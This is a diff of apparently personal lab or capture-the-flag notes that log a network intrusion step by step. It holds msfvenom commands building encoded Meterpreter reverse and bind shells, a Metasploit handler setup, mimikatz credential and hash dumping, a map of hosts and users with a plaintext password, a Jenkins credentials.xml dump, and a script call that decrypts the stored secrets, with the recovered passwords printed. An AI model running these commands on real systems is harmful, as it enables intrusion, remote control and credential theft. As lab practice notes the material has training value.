@@ -156,7 +156,7 @@ Trying to prepare metasploit payload
 my local ip is 10.59.4.104
 
 + Reverse shell
-msfvenom --payload windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai -i 5 LHOST=10.59.4.104 LPORT=443 > calc.exe
+msfvenom --payload windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai -i 5 LHOST=10.59.4.104 LPORT=443 > reverse-443.exe
 
 + Bind shell:
 msfvenom --payload windows/meterpreter/bind_tcp --format exe --encoder x86/shikata_ga_nai -i 5 RHOST=10.59.4.20 LPORT=443 > bind-443.exe
@@ -167,8 +167,8 @@ msfvenom --payload windows/meterpreter/bind_tcp --format exe --encoder x86/shika
 Try to create reverse shell
 ~msfconsole~
 use exploit/multi/handler
-set lhost 10.59.4.104
-set lport 443
+set LHOST 10.59.4.104
+set LPORT 443
 
 Host 10.59.4.14:8080 is running Jenkins 2.125
 
@@ -178,9 +178,82 @@ https://www.cybersecurity-help.cz/vdb/SB2018121801
 https://jenkins.io/security/advisory/2018-12-05/
 
 ** Network map
+10.59.4.*
 .14 - jenkins server
 .13 - 
+.20 - Alice, windows 8.1
+.21 - Bob - cannot run meterpreter
+.22 - Charles - cannot run meterpreter
+.23 - D - 
+.24 - E Edward - windows 8.1 9600
+.25 - windows, fred -
+ + Fred: WildFred8300
 
+14:28 - used mimikatz through metasploit 
+~msv~ credentials - shows only Alice's credentials
+
+14:30 - attempted to upload a reverse shell to .22 machine (charles)
+- file gets disappeared
+14:43
+
+Extracted excel file from .25
+
+14:48 - got meterpreter on .24
+running ~msv~ shows users EDWARDS
+
+running mimikatz_command -f samdump::hashes
+shows 
+
+15:00 captured prod.key from edwards
+ - prod.key
+
+15:20 - jenkins password
+*** Jenkins job output of 
+~cat /var/lib/jenkins/*.xml~
+
+ <java.util.concurrent.CopyOnWriteArrayList>
+        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
+          <scope>GLOBAL</scope>
+          <id>ffc2f9e0-02b6-4d34-8b16-96c22945f750</id>
+          <description>test</description>
+          <username></username>
+          <password>{AQAAABAAAAAwwxpsXzQEg1RdEol3PEE1NrwNq8X8JMGTlffcz/yAS+CRsUGC1YgjuKqGU/c+C+M2gYJBvczf6pSx6hDXiIoC9w==}</password>
+        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
+        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
+          <scope>GLOBAL</scope>
+          <id>24dad117-a27e-4c58-bb8a-f544564528b7</id>
+          <description>Yoda User</description>
+          <username></username>
+          <password>{AQAAABAAAAAwejhWzh4CMShoXUyYgFOuzRwMpH7SWCj17VWni24Xhq/Vkiu2hQeQH07GQt8Ql7j9Zw/AK77a57VU+7VJG22/QA==}</password>
+        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
+        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
+          <scope>GLOBAL</scope>
+          <id>7b5076ae-1f92-43bd-9459-d12eda67695d</id>
+          <description>Tomcat Manager</description>
+          <username></username>
+          <password>{AQAAABAAAAAgpZgjaIfvHZiqDJFBXbvDTALaaa4jgkVj28x3VWNb9W/2Bfoa2X2k0bmRkYZltydM}</password>
+        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
+      </java.util.concurrent.CopyOnWriteArrayList>
+
+*** Password decrypt:
+https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml
+
+go to [jenkins]/script
+
+*** Run this in jenkins script
+println(hudson.util.Secret.decrypt("{AQAAABAAAAAgpZgjaIfvHZiqDJFBXbvDTALaaa4jgkVj28x3VWNb9W/2Bfoa2X2k0bmRkYZltydM}"))
+
+Tomcat manager:
+Result: $zFSKM#o#S3QrDS!D(nq
+
+Test 
+password: 8I8_3Av|-:w7Y6|%_-0_^9t2IHRXL1~J
+
+Yoda:
+password: This is not the password you're looking for.
+
+*** Vault - .13
+http://10.59.4.13:8080/vsEncryptionPhrase
 
 * Challenge 4
 
